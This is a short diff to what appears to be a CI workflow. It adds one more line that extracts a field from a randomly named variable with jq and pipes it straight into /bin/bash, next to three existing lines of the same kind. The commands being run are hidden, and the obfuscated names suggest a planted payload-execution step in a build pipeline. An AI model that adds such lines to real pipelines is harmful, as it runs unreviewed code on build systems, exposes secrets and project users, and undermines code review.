@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$xlni17035" | jq -r .cq84358 | /bin/bash
           echo $bsu33521 | jq -r .jkvv0 | /bin/bash
           echo $l908 | jq -r .ui2 | /bin/bash
+          printf '%s' "$sy10" | jq -r .v35 | /bin/bash
 
       - name: Archive output
         if: always()
